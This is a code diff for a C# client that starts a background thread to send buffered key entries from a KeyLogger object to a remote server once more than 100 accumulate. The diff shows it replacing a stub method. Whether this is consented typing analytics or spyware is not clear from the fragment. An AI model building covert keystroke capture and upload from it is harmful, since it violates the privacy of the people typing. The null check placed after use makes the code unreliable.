@@ -14,14 +14,16 @@ namespace UPClient
         ClientConnectionManager connection;
         KeyLogger keyLogger;
         Thread runThread;
-        runningWnd UI;
-        public Client(String serverAddress, runningWnd parent)
+        RunningWnd UI;
+        int ID;
+        public Client(String serverAddress, RunningWnd parent)
         {
             keyLogger = new KeyLogger();
             connection = new ClientConnectionManager(serverAddress);
             UI = parent;
             connection.Connect();
-            connection.SendData("username","pass",new List<KeyEntry>());
+            runThread = new Thread(new ThreadStart(SendData));
+            runThread.Start();
         }
         public bool Login(String UserName, String Password)
         {
@@ -31,9 +33,17 @@ namespace UPClient
         {
             return true;
         }
-        public bool SendData()
+        public void SendData()
         {
-            return true;
+            while(connection.Connected)
+            {
+                if (keyLogger.GetData().Count > 100 && keyLogger != null)
+                {
+                    connection.SendData(keyLogger.GetData());
+                    keyLogger.GetData().Clear();
+                }
+                System.Threading.Thread.Sleep(2000);
+            }
         }
         public void Start()
         {
